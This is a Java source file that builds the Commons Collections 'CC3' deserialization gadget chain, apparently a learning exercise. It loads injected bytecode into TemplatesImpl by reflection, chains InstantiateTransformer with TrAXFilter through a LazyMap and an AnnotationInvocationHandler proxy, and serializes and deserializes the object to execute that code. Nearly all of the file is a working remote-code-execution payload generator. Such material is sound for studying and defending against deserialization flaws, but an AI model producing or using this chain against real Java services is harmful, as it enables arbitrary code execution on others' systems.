package com.drose.CC3;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.io.*;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class cc3 {
    public static void main(String[] args) throws TransformerConfigurationException, IOException, NoSuchFieldException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException {
        //补充安全省略设置
        System.setProperty("org.apache.commons.collections.enableUnsafeSerialization", "true");
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();

        //赋值_name不为null
        Field nameField = templatesClass.getDeclaredField("_name");
        nameField.setAccessible(true);
        nameField.set(templates, "Dr0se");

        //赋值_bytecodes二维数组为恶意代码
        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        byte[] evil = Files.readAllBytes(Paths.get("D://java_project//sec-learning//CC//target//classes//com//drose//CC3//Calc.class"));
        byte[][] codes = {evil};
        bytecodesField.set(templates, codes);

        //赋值_tfactory 为TransformerFactoryImpl 也就是不为null。
        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates, new TransformerFactoryImpl());


//        templates.newTransformer();


        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
//        instantiateTransformer.transform(TrAXFilter.class);
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class), // 构造 setValue 的可控参数
                instantiateTransformer
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //获取map
        HashMap<Object,Object> hashMap = new HashMap();
        //调用lazyMap的decorate静态方法，进而调用lazyMap的构造方法，传入chain为factory进行赋值，链接尾部exec
        Map lazyMapForHack = LazyMap.decorate(hashMap, chainedTransformer);
//        lazyMapForHack.get("Dr0se");

//        通过反射获取AnnotationInvocationHandler的构造方法
        Class AnnotationInvocationHandlerRef=Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor =AnnotationInvocationHandlerRef.getDeclaredConstructor(Class.class,Map.class);
        constructor .setAccessible(true);
        //通过反射创建 Override 类的代理对象 instance,并设置其调用会委托给 lazyMapForHack 对象
        InvocationHandler instance = (InvocationHandler) constructor.newInstance(Override.class, lazyMapForHack);

//创建Map接口的代理对象proxyInstance,并设置其调用处理器为instance
        Map proxyInstance = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]{Map.class}, instance);
//再次通过反射创建代理对象
        Object o = constructor.newInstance(Override.class, proxyInstance);
        serialize(o);
        unserialize("test.txt");

    }
    //序列化反序列化
    public static void serialize(Object obj) throws IOException, FileNotFoundException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("./test.txt"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
